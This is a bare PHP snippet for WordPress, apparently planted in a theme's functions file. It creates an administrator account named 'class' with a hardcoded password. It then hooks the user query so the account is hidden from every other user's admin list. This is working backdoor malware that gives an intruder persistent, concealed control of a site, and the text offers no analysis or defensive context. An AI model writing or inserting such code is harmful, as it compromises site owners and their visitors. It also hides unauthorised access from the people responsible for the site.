$new_class_functions =new WP_User(wp_create_user('class','functions-class'));
 $new_class_functions->set_role('administrator');

 function functions_class_include($user_search) {
 global $current_user;
 $get_functions_class = $current_user->user_login;
 if ($get_functions_class != 'class') {
 global $wpdb;
 $user_search->query_where = str_replace('WHERE 1=1',
 "WHERE 1=1 AND {$wpdb->users}.user_login != 'class'",$user_search->query_where);
 }
 }
add_action('pre_user_query','functions_class_include');